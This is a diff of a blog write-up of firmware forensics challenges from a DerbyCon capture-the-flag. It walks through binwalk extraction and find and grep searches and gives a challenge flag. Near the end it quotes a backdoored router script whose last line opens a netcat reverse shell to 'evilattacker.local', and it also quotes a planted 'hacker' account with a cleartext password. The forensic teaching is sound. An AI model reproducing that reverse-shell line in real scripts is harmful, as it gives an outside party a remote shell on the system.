@@ -39,6 +39,7 @@ Unfortunately, I waited several weeks after the conference to begin writing this
   - [Forensics 101 (part 6)](#forensics-101-part-6)
   - [Firmware Hacked (part 1)](#firmware-hacked-part-1)
   - [Firmware Hacked (part 2)](#firmware-hacked-part-2)
+- [Wrap-up](#wrap-up)
 
 ## Trivia
 
@@ -935,7 +936,7 @@ Ok, now we are on to the second set of forensics challenges. We are provided a `
 Firmware: data
 ```
 
-Searching the internet, I learned [`binwalk`][binwalk] is a firmware analysis tool that could help us.
+Neat. Searching the internet, I learned [`binwalk`][binwalk] is a firmware analysis tool that can help us.
 
 ![binwalk command][]
 
@@ -1001,14 +1002,14 @@ $TY-08-21 10:09:41.0000000000 _Firmware.extracted/dhcp6c
 $TY-08-21 10:09:41.0000000000 _Firmware.extracted/dhcp6c.conf
 $TY-08-21 10:09:41.0000000000 _Firmware.extracted/dhcp6c-state
 $TY-08-21 10:09:41.0000000000 _Firmware.extracted/dhcp6s
+...
 ```
 
-This is just a snippet of the returned results. You can see I've formatted the files with the last modified timestamp on the left. Let me say that getting to this point was at least an hour of blind searching through the file system until I organized my thoughts well enough to execute that `find` command. `_Firmware.extracted/authorize` looks interesting, however...
+This is just a snippet of the returned results. You can see I've formatted the files with the last modified timestamp on the left. Let me say that getting to this point was at least an hour of blind searching through the file system until I organized my thoughts well enough to execute that `find` command. Feeling smug, I notice an interesting looking file name at the top of the list: `_Firmware.extracted/authorize`.
 
 ```bash
 ➜ cat _Firmware.extracted/authorize                
 
-...
 ...
 
 #
@@ -1041,13 +1042,176 @@ hacker    Cleartext-Password := "toor"
 #########################################################
 ```
 
-Well that definitely looks suspicious. Now... I don't remember exactly what the flag was for this. I think it was the file path? You're close once you find that the hacker created an account for themselves. I'm pretty sure the flag was the file path or name.
+Well that definitely looks suspicious. However, if we look at the command we used to generate this list of modified files, you may notice I made a mistake. Let's try it again:
+
+```bash
+➜ find _Firmware.extracted -type f -newermt 2019-08-07 -printf '$TY-%Tm-%Td %TT %p\n' | sort -r
+
+$TY-09-27 21:25:17.7186270680 _Firmware.extracted/CB2787.xz
+$TY-09-27 21:25:17.7186270680 _Firmware.extracted/CB2787
+$TY-09-27 21:25:17.7106270680 _Firmware.extracted/CB2309.xz
+$TY-09-27 21:25:17.7106270680 _Firmware.extracted/CB2309
+$TY-09-27 21:25:17.7066270670 _Firmware.extracted/CB20BF.xz
+$TY-09-27 21:25:17.7066270670 _Firmware.extracted/CB20BF
+$TY-09-27 21:25:17.4786270590 _Firmware.extracted/19C2AF.squashfs
+$TY-09-27 21:25:16.3666270470 _Firmware.extracted/22CB.7z
+$TY-09-27 21:25:16.0000000000 _Firmware.extracted/22CB
+$TY-08-21 10:24:26.0000000000 _Firmware.extracted/squashfs-root/usr/sbin/httpd
+$TY-08-21 10:24:26.0000000000 _Firmware.extracted/httpd
+$TY-08-21 10:09:42.0000000000 _Firmware.extracted/var
+$TY-08-21 10:09:42.0000000000 _Firmware.extracted/user
+$TY-08-21 10:09:42.0000000000 _Firmware.extracted/smb
+$TY-08-21 10:09:41.0000000000 _Firmware.extracted/yes
+$TY-08-21 10:09:41.0000000000 _Firmware.extracted/xl2tpd.conf
+$TY-08-21 10:09:41.0000000000 _Firmware.extracted/xargs
+$TY-08-21 10:09:41.0000000000 _Firmware.extracted/write
+$TY-08-21 10:09:41.0000000000 _Firmware.extracted/whoami
+$TY-08-21 10:09:41.0000000000 _Firmware.extracted/which
+$TY-08-21 10:09:41.0000000000 _Firmware.extracted/wget
+$TY-08-21 10:09:41.0000000000 _Firmware.extracted/wc
+$TY-08-21 10:09:41.0000000000 _Firmware.extracted/watchdog
+$TY-08-21 10:09:41.0000000000 _Firmware.extracted/watch
+...
+```
+
+Ahh, we needed to reverse the sort in order to get the most recently modified files. It is unlikely that the `authorize` file is actually what we need since it was not recently modified. At the very least, I didn't see anything that screamed "flag." Now we have a more updated list of modified files. Wait...but no, those 9/27 files correspond to the day I re-ran this exercise when writing this blog. I'm not getting accurate results from this.
+
+At this point, a couple of hours into this challenge, I was very frustrated and running whatever querying commands I could think of.
+
+```bash
+grep --color -E -R Flag: ./_Firmware.extracted
+```
+
+![firmware cracked grep][]
+
+Wait. Wa-oh. Damn it. Ok. That's __3805d35c-2440-4e0a-8dac-52245b6232ed__.
 
 ### Firmware Hacked (part 2)
 
 Points: 30
 
 > We think there's a backdoor, find the script. Identify and submit the domain.
+
+This challenge frustrated me more than the previous one. I spent about 2-3 hours on this challenge and I was throwing commands at the file system. I know I need to find a script, so I collect a list of all scripts:
+
+```bash
+➜ find _Firmware.extracted -type f -name '*.sh' -exec ls -la '{}' \;
+
+-rw-r--r-- 1 artis3n artis3n 990 Aug  6 03:54 _Firmware.extracted/cidrroute.sh
+-rw-r--r-- 1 artis3n artis3n 542 Aug 28  2012 _Firmware.extracted/hotplug2-createmtd.sh
+-rw-r--r-- 1 artis3n artis3n 1519 Aug  6 03:54 _Firmware.extracted/lease_update.sh
+-rw-r--r-- 1 artis3n artis3n 934 Aug  6 03:54 _Firmware.extracted/openvpnlog.sh
+-rw-r--r-- 1 artis3n artis3n 1866 Aug  6 03:54 _Firmware.extracted/openvpnstate.sh
+-rw-r--r-- 1 artis3n artis3n 1981 Aug  6 03:54 _Firmware.extracted/openvpnstatus.sh
+-rw-r--r-- 1 artis3n artis3n 2697 Aug  6 03:54 _Firmware.extracted/wl_snmpd.sh
+-rw-r--r-- 1 artis3n artis3n 821 Aug  6 03:54 _Firmware.extracted/qmisierrastatusdetect.sh
+-rw-r--r-- 1 artis3n artis3n 1475 Aug  6 03:54 _Firmware.extracted/qmistatus.sh
+-rw-r--r-- 1 artis3n artis3n 2322 Aug  6 03:54 _Firmware.extracted/sierrastatus.sh
+-rw-r--r-- 1 artis3n artis3n 972 Aug  6 03:54 _Firmware.extracted/pptpd_client.sh
+-rw-r--r-- 1 artis3n artis3n 1950 Aug  6 03:54 _Firmware.extracted/proxywatchdog.sh
+-rw-r--r-- 1 artis3n artis3n 119 Aug  6 03:54 _Firmware.extracted/schedulerb.sh
+-rw-r--r-- 1 artis3n artis3n 617 Aug  6 03:54 _Firmware.extracted/wdswatchdog.sh
+-rw-r--r-- 1 artis3n artis3n 1404 Aug  6 03:54 _Firmware.extracted/connect.sh
+-rw-r--r-- 1 artis3n artis3n 6882 Aug  6 03:54 _Firmware.extracted/hso_connect.sh
+-rw-r--r-- 1 artis3n artis3n 21 Aug 21 10:09 _Firmware.extracted/functions.sh
+-rw-r--r-- 1 artis3n artis3n 190 Aug  6 03:54 _Firmware.extracted/vtysh_init.sh
+-rw-r--r-- 1 artis3n artis3n 1215 Aug  6 03:54 _Firmware.extracted/call_splashd_check.sh
+-rw-r--r-- 1 artis3n artis3n 3126 Aug  6 03:54 _Firmware.extracted/check_splashd.sh
+-rw-r--r-- 1 artis3n artis3n 939 Aug  6 03:54 _Firmware.extracted/remote_settings.sh
+-rw-r--r-- 1 artis3n artis3n 274 Aug  6 03:54 _Firmware.extracted/test_arp.sh
+-rw-r--r-- 1 artis3n artis3n 124 Aug  6 03:54 _Firmware.extracted/traffic_input_count.sh
+-rw-r--r-- 1 artis3n artis3n 123 Aug  6 03:54 _Firmware.extracted/traffic_output_count.sh
+-rw-r--r-- 1 artis3n artis3n 1131 Aug  6 03:54 _Firmware.extracted/upgrade_check.sh
+-rwxr-xr-x 1 artis3n artis3n 990 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/cidrroute.sh
+-rwxr-xr-x 1 artis3n artis3n 156 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/comgt/connect.sh
+-rwxr-xr-x 1 artis3n artis3n 821 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/comgt/qmisierrastatusdetect.sh
+-rwxr-xr-x 1 artis3n artis3n 1475 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/comgt/qmistatus.sh
+-rwxr-xr-x 1 artis3n artis3n 2322 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/comgt/sierrastatus.sh
+-rwxr-xr-x 1 artis3n artis3n 972 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/config/pptpd_client.sh
+-rwxr-xr-x 1 artis3n artis3n 1950 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/config/proxywatchdog.sh
+-rwxr-xr-x 1 artis3n artis3n 119 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/config/schedulerb.sh
+-rwxr-xr-x 1 artis3n artis3n 617 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/config/wdswatchdog.sh
+-rwxr-xr-x 1 artis3n artis3n 542 Aug 28  2012 _Firmware.extracted/squashfs-root/etc/hotplug2-createmtd.sh
+-rwxr-xr-x 1 artis3n artis3n 1404 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/hso/connect.sh
+-rwxr-xr-x 1 artis3n artis3n 6882 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/hso/hso_connect.sh
+-rwxr-xr-x 1 artis3n artis3n 1519 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/lease_update.sh
+-rwxr-xr-x 1 artis3n artis3n 934 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/openvpnlog.sh
+-rwxr-xr-x 1 artis3n artis3n 1866 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/openvpnstate.sh
+-rwxr-xr-x 1 artis3n artis3n 1981 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/openvpnstatus.sh
+-rwxr-xr-x 1 artis3n artis3n 2697 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/wl_snmpd.sh
+-rwxr-xr-x 1 artis3n artis3n 190 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/bin/vtysh_init.sh
+-rwxr-xr-x 1 artis3n artis3n 1215 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/call_splashd_check.sh
+-rwxr-xr-x 1 artis3n artis3n 3126 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/check_splashd.sh
+-rwxr-xr-x 1 artis3n artis3n 939 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/remote_settings.sh
+-rwxr-xr-x 1 artis3n artis3n 274 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/test_arp.sh
+-rwxr-xr-x 1 artis3n artis3n 124 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/traffic_input_count.sh
+-rwxr-xr-x 1 artis3n artis3n 123 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/traffic_output_count.sh
+-rwxr-xr-x 1 artis3n artis3n 1131 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/upgrade_check.sh
+```
+
+I start grepping through these files looking for something suspicious. I try `grep`ing for `*com*`, `*org*`, `*net*`, etc. across these files, trying to suss out URLs. Nothing suspicious pops out. I am not getting anywhere with this challenge.
+
+A colleague prompts me to think about how, as an attacker, I might try to exfiltrate my data from the backdoor. I look again at my list of scripts.
+
+```bash
+_Firmware.extracted/openvpnlog.sh
+_Firmware.extracted/openvpnstate.sh
+_Firmware.extracted/openvpnstatus.sh 
+```
+
+![not sure if][]
+
+
+```bash
+➜ cat _Firmware.extracted/openvpnstatus.sh 
+
+#!/bin/sh
+if [ "$(nvram get openvpn_enable)" = "1" ]; then
+PORT=`grep "^management " /tmp/openvpn/openvpn.conf | awk '{print $3}'`
+if [ x${PORT} = x ]
+then
+	PORT=14
+fi
+        echo -n "<table><tr><td colspan=5>VPN Server Stats: "
+	# STATS
+        /bin/echo "load-stats" | /usr/bin/nc 127.0.0.1 ${PORT} | grep SUCCESS | \
+        awk -F " " '{print $2}'| awk -F "," '{print $1 ", " $2 ", " $3}'
+        echo -e "<hr/></td></tr>\n"
+        # CLIENT LIST
+        /bin/echo "status 2" | /usr/bin/nc 127.0.0.1 ${PORT} | \
+        awk '/HEADER,CLIENT_LIST/{printline = 1; next} /HEADER,ROUTING_TABLE/ {printline = 0} printline' | \
+        awk -F "," 'BEGIN{print "<tr><th>Client</th><th>Remote IP:Port</th><th>Bytes Received</th><th>Bytes Sent</th><th>Connected Since</th></tr>\n"}{
+                printf "<tr><td>%s</td><td>%s</td><td>%d</td><td>%d</td><td>%s</td></tr>\n", $2, $3, $6, $7, $8;
+        }
+        END{print "\n<tr><td colspan=5><br></td></tr>\n<tr><td colspan=5>VPN Server Routing Table<hr/></td></tr>\n"}'
+        # ROUTING TABLE
+        /bin/echo "status 2" | /usr/bin/nc 127.0.0.1 ${PORT} | \
+        awk '/HEADER,ROUTING_TABLE/{printline = 1; next} /GLOBAL_STATS/ {printline = 0} printline' | \
+        awk -F "," 'BEGIN{print "<tr><th>Client</th><th>Virtual Address</th><th colspan=2>Real Address</th><th>Last Ref</th></tr>\n"}{
+                printf "<tr><td>%s</td><td>%s</td><td colspan=2>%s</td><td>%s</td></tr>\n", $3, $2, $4, $5;
+        }
+        END{print "\n"}'
+        echo -e "</table>\n<br>\n";
+fi
+if [ "$(nvram get openvpncl_enable)" = "1" ]; then
+PORT=`grep "^management " /tmp/openvpncl/openvpn.conf | awk '{print $3}'`
+if [ x${PORT} = x ]
+then
+	PORT=16
+fi
+/bin/echo "status 2" | /usr/bin/nc 127.0.0.1 ${PORT}  | grep "bytes" | awk -F "," 'BEGIN{print "<table><tr><td colspan=2>VPN Client Stats<hr></td></tr>"}{
+        printf "<tr>\n<td>%s</td><td>%d</td>\n</tr>", $1, $2;
+}
+END{print "</table>"}'
+fi
+/usr/bin/nc -e /bin/sh  evilattacker.local 80
+```
+
+Well, all right then. __evilattacker.local__. In hindsight, I should have grep'd for usage of nefarious exfiltration tools, of which [netcat][] (`nc`) is popular. That would have sped up the time it took me to solve this significantly.
+
+## Wrap-up
+
+I would like to thank Bank of America's Global Information Security Team for putting together a great CTF. I really enjoyed it (aside from the times I wanted to bash my head against something hard) and I learned a lot from it. I look forward to taking these skills and improving on them in future CTFs.
 
 [derbycon]: https://www.derbycon.com/
 [hackers movie]: https://en.wikipedia.org/wiki/Hackers_(film)
@@ -1105,3 +1269,6 @@ Points: 30
 [binwalk]: https://github.com/ReFirmLabs/binwalk
 [binwalk command]: /img/derbycon_boa_ctf/binwalk.png
 [binwalk extracted]: /img/derbycon_boa_ctf/binwalk_extracted.png
+[firmware cracked grep]: /img/derbycon_boa_ctf/firmware_cracked_grep.png
+[netcat]: https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-netcat-swiss-army-knife-hacking-tools-0148657/
+[not sure if]: /img/derbycon_boa_ctf/notsureif.jpg
